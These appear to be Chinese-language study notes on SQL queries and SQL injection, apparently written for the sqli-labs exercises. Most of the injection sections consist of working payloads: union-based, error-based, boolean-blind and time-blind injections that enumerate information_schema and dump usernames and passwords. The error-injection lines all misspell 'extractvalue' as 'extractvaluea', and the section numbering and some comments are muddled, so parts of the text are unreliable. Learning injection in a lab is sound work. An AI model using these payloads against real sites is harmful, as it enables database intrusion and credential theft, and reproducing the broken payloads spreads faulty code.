二、sql 查询

\1. >select * from users where id=1;

#select+列名（*代表所有）from+表名 where+条件语句

\2. >select * from users where id（‘3’）；

#从users表格，查询所有包含id为3{和1差不多}

\3. >select * from users where id=（select id from users where username=（‘admin’））；

#子查询 优先执行（）内查询语句

4.>select id from users union select email_id from emails;

#查询并合并数据显示

5.>select * from users where id=1 union select * from emails where id=1;

#联合注入前后表格列数必须相等（即users 和 emails 列数相等） union查询

6.>select * from users where id=1 union select *,3 from emails where id=1;

# 3（随便即可）为补充列（users列数为3，emails列数为2，故加一列使其列数相等）

7.>select username from users group by username;

#对username进行分组

8.>select * from users where id=3 group by 2; group by分组查询

>select * from users where id=3 group by 4;

#by 2,4,8~~依次排查到报错为止，从而确定列数

9.>select * from users order by 1（表格的列数） ;

#对users的第一列进行升序排序

>select * from users order by 1 desc； order by 默认升序排列

#对users的第一列进行降序排序

10.>select * from users limit 1,3;

#限制为从第1行开始显示3行

>select * from users limit 0,3;

#限制为从第0行开始显示3行（实际是从第0行开始计数）

11.>select * from users where id=2 and username=benben;

#在users中查询id为2且用户名为benben的数据

12.>select * from users where id=2 or username=benben;

#在users中查询id为2和 用户名为benben的数据

四、基础注入

1．如何判断是字符型注入还是数字型注入

使用and1=1和and1=2来判断

数字型一般提交内容为数字，但数字不一定是数字型

Less-1提交and1=1和提交and1=2都能正常显示界面，则不可能是数字型注入，即为字符型注入

Less-2 提交and1=2条件无法满足，语句无法被相关数据库查询到，网页无法正常显示，判断为数字型注入

2.如何判断闭合方式

闭合方式 ‘ “ ‘) “)

闭合的作用：手工提交闭合符号，结束前一段查询语句，后面即可加入其他语句，查询所需要的参数

不需要的语句可以用注释符号 ‘–+’ 或 ‘#’ 或 ‘%23’注释掉。

五、UNION注入

字符型

1.提前了解 拿到表名和列名

tables 表名集合表

columns 列名集合表

\2. 查找数据库security中的表名

所需要表名信息在

数据库Information_schema 数据表tables 数据列table_name

?id=-1’ union select 1,2,table_name from information_schema.tables where table_schema=database() {‘security’}–+

可以使用group_concat使信息显示在一行

?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+

\3. 查找数据库security中数据表users的列名

?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’–+

4.查询最终目标

Select列名+from表名+where限定语句

?id=-1’ union select 1,2,group_concat(username,password) from users–+

Username和password中间可以用分隔符（‘~’）隔开

数字型

数字型不需要在注入点后加闭合符号如（?id=1）

其他步骤和字符型相同

六、报错注入

针对页面没有回显，使用报错注入得到想要的数据

利用extractvalue() 报错注入

1.查询库名

?id =1’ union select 1,extractvaluea(1,concat(0x7e,(select database()))),3–+

2.查询表名

?id =1’ union select 1,extractvaluea(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3–+

3.查询列名

?id =1’ union select 1,extractvaluea(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’))),3–+

4.查询用户信息

?id =1’ union select 1,extractvaluea(1,concat(0x7e,(select group_concat(username,password) from users))),3–+

注意：报错注入一次性回显字符有限

需要借助substring(1,2,3)

?id =1’ union select 1,extractvaluea(1,concat(0x7e,(select substring(group_concat(username,password),1,30) from users))),3–+ {1，30表示从第1个字符开始往后显示30位字符 }

利用updatexml报错注入 updatexml(1, 2 ,3) concat(‘~’,(select语句))

?id=1”) and 1=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())) ,3) –+

盲注（布尔盲注，时间盲注，报错盲注）

1.布尔盲注

主要函数 ascii(‘e’) 查询ASCII码表将e转换成数字

例如要查询数据库名称，在布尔盲注中需借用ascii（）函数

ascii((select database()))>=100 此函数只能确定数据库第一个字母的替换值

substr((select database()),1,1) 此函数表名从数据库第一个字母开始向后显示一位字母

两函数结合起来即可实现布尔盲注

?id=1’ and ascii(substr((select database()),1,1))>=100 –+

然后对其进行改动，一步一步确定数据库名称

2.时间盲注（web页面只返回一个正常页面，利用页面响应时间不同，逐个猜解数据。）

前提是数据库会执行命令代码，只是不反馈页面信息

主要函数sleep(0)休眠时间为0秒 if(condition,true,false) condition为条件，true当条件为真时返回的值，false当条件为假时返回的值

例如 if(1=2,sleep(1),sleep(4))

?id=1’ and if(ascii(substr((select database()),1,1))>=100,sleep(0),sleep(3))–+

?id=1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100,sleep(0),sleep(3))–+
